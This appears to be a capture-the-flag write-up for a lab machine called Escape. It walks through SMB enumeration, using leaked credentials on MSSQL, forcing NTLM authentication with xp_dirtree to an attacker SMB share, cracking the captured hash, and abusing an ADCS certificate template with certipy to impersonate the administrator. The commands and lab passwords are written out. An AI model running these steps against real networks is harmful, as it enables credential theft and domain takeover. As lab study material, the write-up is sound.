# 📦 Escape

I start off with a scan for open ports and anonymous smb share:

<figure><img src="../../../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

and smb share:

<figure><img src="../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

In the public share we can download a _**SQL Server Procedures.pdf**_ file ->

We can see those credentials for the new hired:

<figure><img src="../../../.gitbook/assets/image (214).png" alt=""><figcaption><p>PublicUser:GuestUserCantWrite1</p></figcaption></figure>

We can connect to the mssql instance with local auth:

<figure><img src="../../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

I tried getting command execution with xp\_cmdshell but it was not active, while looking at how i could try to exploit i found this article:

{% embed url="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478" %}

I did not manage to complete the exploitation by following this article so i tried connecting manually after setting up my smb server:

```
smbserver.py -smb2support myshare /myshare
```

```
 mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
 EXEC xp_dirtree '\\10.10.14.173\myshare', 1, 1
```

<figure><img src="../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

and after cracking the hash we have `REGGIE1234ronnie`

Then after that i run a bloodhound python just to find some stuff we can exploit:

```
bloodhound-python -u sql_svc -p 'REGGIE1234ronnie' -c All -d sequel.htb -ns 10.129.56.57
```

```
neo4j console
bloodhound
```

I get some informations but nothing too crazy for the moment, while enumerating some stuff i found this ADCS misconfig:

<figure><img src="../../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

But i did not manage to find anything for the moment so i continued enumeration

In a C:\SQLServer\Logs file i found this:

<figure><img src="../../../.gitbook/assets/image (220).png" alt=""><figcaption><p>Ryan.Cooper:NuclearMosquito3</p></figcaption></figure>

maybe the person connecting missclicked the auth and revealed the password in clear ->

<figure><img src="../../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

Not knowing too much i followed this blog post about ADCS recon:

{% embed url="https://medium.com/@offsecdeer/adcs-exploitation-part-1-common-attacks-b7ae62519828" %}

```
certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
```



We see that the template name is UserAuthentication so we can use that to request for administartor's UPN and be able to request a TGT as administrator to dump the NT hash and do pass the hash to connect as admin ->&#x20;

<figure><img src="../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

```
 certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
 certipy auth -pfx administrator.pfx
```

<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>
